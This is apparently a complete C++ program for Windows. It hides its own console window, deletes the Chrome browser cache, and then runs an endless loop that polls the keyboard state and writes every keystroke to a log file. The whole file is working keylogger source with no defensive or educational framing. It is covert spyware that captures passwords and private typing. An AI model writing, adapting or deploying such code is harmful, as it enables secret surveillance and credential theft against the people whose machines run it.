#include <iostream>
#include <cstdlib>
#include <string>
#include <filesystem>
#include <Windows.h>
#include <winuser.h>
#include <fstream>

void clearBrowserCache(){
    std::string appData = getenv("APPDATA");
    if (appData.empty()) return ;
    else{
        std::string cachePath = appData + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\";
        try{
            std::filesystem::remove_all(cachePath);
            std::string createpath = "mkdir" + cachePath;
            std::error_code ec;
            std::filesystem::create_directory(cachePath, ec);
            if (ec) std::cerr << "Error creating cache directory: " << ec.message() << '\n';
        }
        catch(const std::filesystem::filesystem_error& e){
            std::cerr << "Error removing cache directory: " << e.what() << '\n';
        }
        
    }
}

void startLogging(){
    std::ofstream log;
    log.open("log.txt", std::ios::app);
    while(true){
        for (int i = 0x08; i <= 0xFE; i++){
            if (GetAsyncKeyState(i) & 0x8000) {
                switch (i) {
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                        break;
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        log << char(i);
                }
            }
            Sleep(100);
        }
    }
}

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    clearBrowserCache();
    startLogging();
    return 0;
}